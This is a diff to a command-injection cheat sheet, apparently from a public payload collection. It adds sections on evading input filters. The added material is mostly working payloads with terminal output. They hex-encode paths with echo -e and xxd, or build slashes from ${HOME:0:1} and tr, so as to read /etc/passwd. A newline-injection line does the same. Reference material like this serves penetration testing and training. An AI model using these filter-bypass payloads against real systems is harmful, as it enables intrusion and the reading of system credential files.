@@ -12,6 +12,7 @@
 * [Filter Bypasses](#filter-bypasses)
   * [Bypass without space](#bypass-without-space)
   * [Bypass with a line return](#bypass-with-a-line-return)
+  * [Bypass characters filter via hex encoding](#bypass-characters-filter-via-hex-encoding)
   * [Bypass blacklisted words](#bypass-blacklisted-words)
    * [Bypass with single quote](#bypass-with-single-quote)
    * [Bypass with double quote](#bypass-with-double-quote)
@@ -106,6 +107,58 @@ ping%PROGRAMFILES:~10,-5%IP
 
 ```powershell
 something%0Acat%20/etc/passwd
+```
+
+### Bypass characters filter via hex encoding
+
+linux
+```
+swissky@crashlab▸ ~ ▸ $ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+/etc/passwd
+
+swissky@crashlab▸ ~ ▸ $ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab▸ ~ ▸ $ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab▸ ~ ▸ $ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab▸ ~ ▸ $ xxd -r -p <<< 2f6574632f706173737764
+/etc/passwd
+
+swissky@crashlab▸ ~ ▸ $ cat `xxd -r -p <<< 2f6574632f706173737764`
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab▸ ~ ▸ $ xxd -r -ps <(echo 2f6574632f706173737764)
+/etc/passwd
+
+swissky@crashlab▸ ~ ▸ $ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+root:x:0:0:root:/root:/bin/bash
+
+```
+
+### Bypass characters filter
+
+Commands execution without backslash and slash - linux bash
+
+```
+swissky@crashlab▸ ~ ▸ $ echo ${HOME:0:1}
+/
+
+swissky@crashlab▸ ~ ▸ $ cat ${HOME:0:1}etc${HOME:0:1}passwd
+root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab▸ ~ ▸ $ echo . | tr '!-0' '"-1'
+/
+
+swissky@crashlab▸ ~ ▸ $ tr '!-0' '"-1' <<< .
+/
+
+swissky@crashlab▸ ~ ▸ $ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+root:x:0:0:root:/root:/bin/bash
+
 ```
 
 ### Bypass Blacklisted words
